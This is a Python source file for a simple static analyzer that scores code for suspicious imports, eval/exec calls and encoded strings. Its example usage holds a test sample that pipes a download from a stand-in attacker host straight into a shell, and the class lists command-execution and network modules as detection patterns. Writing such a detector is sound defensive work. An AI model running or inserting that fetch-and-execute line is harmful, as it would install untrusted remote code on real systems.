"""
Code analyzer for detecting malicious code patterns
"""

import ast
import logging
from typing import Dict, List, Tuple

logger = logging.getLogger(__name__)

class CodeAnalyzer:
    """Analyzes Python code for suspicious patterns"""
    
    def __init__(self):
        self.suspicious_patterns = {
            # Command execution
            'subprocess': ['Popen', 'run', 'call'],
            'os_system': ['os.system', 'os.popen'],
            'eval': ['eval', 'exec'],
            
            # File operations
            'file_access': ['open', 'write', 'read'],
            
            # Network operations
            'network': ['socket', 'urllib', 'requests'],
            
            # Hidden strings
            'string_encoding': ['base64', 'hex', 'encode', 'decode'],
        }
        
        self.risk_score = 0
        self.findings = []
    
    def analyze(self, code: str) -> Dict:
        """
        Analyze code and return findings
        
        Returns:
            {
                'risk_level': 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL',
                'risk_score': 0-100,
                'findings': [list of issues],
                'is_malicious': True/False
            }
        """
        self.risk_score = 0
        self.findings = []
        
        try:
            # Parse code
            tree = ast.parse(code)
        except SyntaxError as e:
            return {
                'risk_level': 'UNKNOWN',
                'risk_score': 0,
                'findings': [f'Syntax error: {e}'],
                'is_malicious': False
            }
        
        # Check for suspicious imports
        self._check_imports(tree)
        
        # Check for suspicious function calls
        self._check_function_calls(tree)
        
        # Check for hidden strings
        self._check_hidden_strings(code)
        
        # Determine risk level
        if self.risk_score >= 70:
            risk_level = 'CRITICAL'
        elif self.risk_score >= 50:
            risk_level = 'HIGH'
        elif self.risk_score >= 30:
            risk_level = 'MEDIUM'
        else:
            risk_level = 'LOW'
        
        return {
            'risk_level': risk_level,
            'risk_score': self.risk_score,
            'findings': self.findings,
            'is_malicious': risk_level in ['HIGH', 'CRITICAL']
        }
    
    def _check_imports(self, tree):
        """Check for suspicious imports"""
        suspicious_modules = ['subprocess', 'socket', 'urllib', 'requests', 'os']
        
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    if any(module in alias.name for module in suspicious_modules):
                        self.findings.append(f"Suspicious import: {alias.name}")
                        self.risk_score += 15
            
            elif isinstance(node, ast.ImportFrom):
                if node.module and any(module in node.module for module in suspicious_modules):
                    self.findings.append(f"Suspicious import: from {node.module}")
                    self.risk_score += 15
    
    def _check_function_calls(self, tree):
        """Check for suspicious function calls"""
        dangerous_calls = {
            'eval': 20,
            'exec': 20,
            'compile': 15,
            '__import__': 15,
        }
        
        for node in ast.walk(tree):
            if isinstance(node, ast.Call):
                if isinstance(node.func, ast.Name):
                    if node.func.id in dangerous_calls:
                        self.findings.append(f"Dangerous function call: {node.func.id}()")
                        self.risk_score += dangerous_calls[node.func.id]
    
    def _check_hidden_strings(self, code):
        """Check for base64-encoded or suspicious strings"""
        if 'base64' in code or 'b64decode' in code:
            self.findings.append("Base64 encoding detected (could hide malicious strings)")
            self.risk_score += 10
        
        if '\\x' in code:
            self.findings.append("Hex-encoded strings detected")
            self.risk_score += 10

# Example usage
if __name__ == "__main__":
    test_code = '''
import subprocess
import os

def process_data(data):
    subprocess.Popen(["/bin/sh", "-c", "curl http://attacker.com/install.sh | bash"])
    return data
'''
    
    analyzer = CodeAnalyzer()
    result = analyzer.analyze(test_code)
    print(result)
